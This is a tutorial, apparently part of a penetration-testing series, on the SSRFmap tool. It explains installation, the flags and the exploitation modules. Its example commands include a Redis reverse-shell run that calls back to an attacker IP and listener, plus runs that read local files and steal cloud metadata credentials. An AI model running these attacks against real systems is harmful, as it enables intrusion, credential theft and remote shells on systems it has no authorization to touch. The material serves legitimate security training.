# 05 — SSRFmap (Automation Tool)

SSRFmap (`swisskyrepo/SSRFmap`) is the closest thing to a "sqlmap-equivalent"
for SSRF: it takes a captured request with a known injectable parameter and
automates fuzzing it against a library of known internal-service exploits
(Redis RCE, MySQL, FastCGI, cloud metadata readers, port scanning, etc.).

## Installation

```
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
pip3 install -r requirements.txt
python3 ssrfmap.py
```

| Part | What it does |
|---|---|
| `git clone ...` | Pulls the tool source. |
| `pip3 install -r requirements.txt` | Installs Python dependencies the tool needs (HTTP request handling, etc.) — must be run from inside the cloned directory since the path is relative. |
| `python3 ssrfmap.py` | Runs with no arguments — prints usage/help, confirming the install worked. |

## Required Input: a Captured Request File

SSRFmap doesn't crawl or discover anything on its own — you give it a raw HTTP
request (the same format Burp Suite uses for "Save item" / Repeater export),
with the SSRF-vulnerable parameter present in it:

```
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close

url=https://www.google.fr
```

Save this as `request.txt`. The `url` parameter is the one SSRFmap will fuzz —
its current value (`https://www.google.fr`) doesn't matter, it just needs to
exist syntactically so the tool knows what to replace.

## Full Flag Breakdown

```
python3 ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
                    [--uagent USERAGENT] [--ssl [SSL]] [--proxy PROXY]
                    [--level [LEVEL]]
```

| Flag | Takes a value? | What it does | Why/when you use it |
|---|---|---|---|
| `-h`, `--help` | No | Prints the usage help and exits. | Quick reference without reading the README. |
| `-r REQFILE` | Yes (file path) | Points the tool at the captured raw HTTP request file. | This is the mandatory base input for every run — without it the tool has nothing to fuzz. |
| `-p PARAM` | Yes (parameter name) | Tells the tool *which* parameter inside the request to substitute payloads into. | A captured request can have multiple parameters; this disambiguates which one is the actual SSRF injection point (here, `url`). |
| `-m MODULES` | Yes (module name, comma-separated for multiple) | Selects which exploitation module(s) to run against the target. | This is the core of the tool — each module knows how to craft a specific internal-service attack (see module table below). Multiple modules can be chained in one run, e.g. `-m readfiles,portscan`. |
| `-l HANDLER` | Yes (port number) | Starts a local listener on the given port, to catch an incoming reverse shell. | Used together with modules that generate reverse-shell payloads (e.g. `redis`) — the module crafts a payload that connects back to you, and `-l` is what's actually listening on your machine for that connection. |
| `-v [VERBOSE]` | Optional | Increases output verbosity. | Useful when a module isn't behaving as expected and you need to see the raw requests it's sending. |
| `--lhost LHOST` | Yes (IP) | The attacker-controlled IP to embed into any reverse-shell payload the module generates. | Functions exactly like `LHOST` in Metasploit — it's not the target, it's *your* address the victim connects back to. |
| `--lport LPORT` | Yes (port) | The port to embed into the reverse-shell payload, matching whatever you pass to `-l`. | Same Metasploit-style convention — `--lport` is what goes *into* the payload; `-l` is what you actually bind locally. They should match. |
| `--uagent USERAGENT` | Yes (string) | Overrides the User-Agent header used when SSRFmap sends its fuzzing requests. | Some WAFs/filters specifically flag default tool user-agents (`python-requests`, etc.); spoofing a normal browser UA is basic evasion. |
| `--ssl [SSL]` | Optional flag | Forces HTTPS for the requests SSRFmap sends, without verifying the certificate. | Needed when the target endpoint is HTTPS-only — certificate verification is skipped because internal/self-signed certs are common and shouldn't block testing. |
| `--proxy PROXY` | Yes (proxy URL) | Routes SSRFmap's own outbound requests through an HTTP(S) proxy, e.g. `http://localhost:8080`. | Lets you route SSRFmap's traffic through Burp so you can watch/intercept every request the automation sends, instead of trusting it blindly. |
| `--level [LEVEL]` | Yes (integer 1–5, default 1) | Controls how many variant/obfuscated forms of each payload are tried — at higher levels it expands a single target like `127.0.0.1` into multiple alternative encodings (e.g. `[::]`, `0000:`, decimal/octal/hex forms) per the filter-bypass techniques in file 03. | Directly automates the manual blacklist-bypass work from section 3.1 of this series — instead of hand-crafting every IP encoding variant, `--level 3` or higher tries a expanding set of them automatically against a filtered target. |

## Module Reference (Selected, via `-m`)

| Module | What it does |
|---|---|
| `readfiles` | Reads local files from the target server (e.g. `/etc/passwd`) via SSRF, commonly using the `file://` scheme or a protocol the back-end fetcher supports. |
| `portscan` | Uses the SSRF to probe a range of ports on a given host — same principle as the manual Burp Intruder subnet sweep in file 02, but automated. |
| `networkscan` | HTTP ping-sweep across a network range, to find live internal hosts before targeting them individually. |
| `aws` | Specifically targets the AWS metadata endpoint to extract instance metadata/IAM credentials (file 04, automated). |
| `gce` | Same concept as `aws`, targeting Google Compute Engine's metadata server. |
| `alibaba` / `digitalocean` | Equivalent metadata-extraction modules for those providers' metadata services. |
| `redis` | Crafts a Redis protocol payload (via the Gopher technique covered in file 06) to achieve command execution/RCE against an internal Redis instance reachable only via the SSRF. |
| `mysql` | Crafts a payload to interact with/execute commands against an internal MySQL service. |
| `fastcgi` | Targets FastCGI to achieve remote code execution on the back-end service. |
| `smtp` | Uses the SSRF to send mail via an internal SMTP relay. |
| `docker` | Targets an exposed/internal Docker API for information disclosure (container/image listing, etc.). |
| `socksproxy` | Sets up the SSRF as a SOCKS4 proxy pivot point into the internal network. |
| `axfr` | Triggers a DNS zone transfer from an internal DNS server via the Gopher protocol, to enumerate internal DNS records. |

## Example Commands, Broken Down

### 1. Read local files + scan ports in one run

```
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan
```
- `-r request.txt` — use the captured request saved earlier.
- `-p url` — the `url` parameter is the injection point.
- `-m readfiles,portscan` — run both modules in this single invocation; comma
  separation chains modules without needing separate runs.

### 2. Targeting an HTTPS endpoint with a spoofed User-Agent

```
python3 ssrfmap.py -r request.txt -p url -m portscan --ssl --uagent "Mozilla/5.0"
```
- `--ssl` — connect over HTTPS, skipping cert verification (needed if the
  target's internal services use self-signed certs, which is extremely common).
- `--uagent "Mozilla/5.0"` — present as a normal browser instead of the
  default tool signature, in case anything downstream is filtering on UA.

### 3. Triggering a Redis reverse shell

```
python3 ssrfmap.py -r request.txt -p url -m redis --lhost=10.10.14.5 --lport=4242 -l 4242
```
- `-m redis` — selects the Redis-targeting exploit module, which crafts a
  Gopher-protocol payload (file 06 explains the underlying mechanism) that
  instructs the internal Redis instance to write a cron job or module that
  spawns a reverse shell.
- `--lhost=10.10.14.5 --lport=4242` — embedded into the generated payload as
  the callback address — this must be an IP/port the attacker actually
  controls and that the target's network can route to (e.g. your VPN/tun0 IP
  in an OSCP-style internal engagement, not a NAT'd home IP unless port
  forwarded).
- `-l 4242` — starts SSRFmap's own listener on port 4242 on your machine, so
  the reverse shell triggered by the payload has somewhere to actually connect
  back to. Without this flag, the payload fires but nothing is listening to
  catch the resulting connection.

### 4. Routing through Burp for visibility

```
python3 ssrfmap.py -r request.txt -p url -m readfiles --proxy http://127.0.0.1:8080
```
- `--proxy http://127.0.0.1:8080` — sends every request SSRFmap generates
  through your local Burp listener, so you can watch (and if needed, modify
  before forwarding) exactly what the tool is doing rather than trusting its
  automated output blindly — important in a real engagement where you need to
  document the exact requests sent for the report.

## Real-World Notes

- SSRFmap is best understood not as a "find SSRF" tool but a "given a
  confirmed SSRF, exploit common internal services automatically" tool — you
  still need to manually confirm the injection point exists first (file 02
  methodology), exactly the same relationship sqlmap has to manual SQLi
  confirmation.
- The `--level` flag is the single most practically useful flag for real
  engagements, because it directly automates the blacklist-bypass encoding
  enumeration from file 03 — manually trying decimal/octal/hex/IPv6-bracket
  forms of an internal IP by hand against a filtered target is tedious; this
  flag tries an expanding set of them for you.
- Module-based RCE chains (`redis`, `mysql`, `fastcgi`) only succeed if the
  internal service is actually reachable *and* the SSRF primitive supports
  whatever protocol smuggling those modules rely on (overwhelmingly the Gopher
  scheme — see file 06) — confirm `gopher://` isn't blocked/stripped by the
  vulnerable app's URL handling before assuming a module "doesn't work."
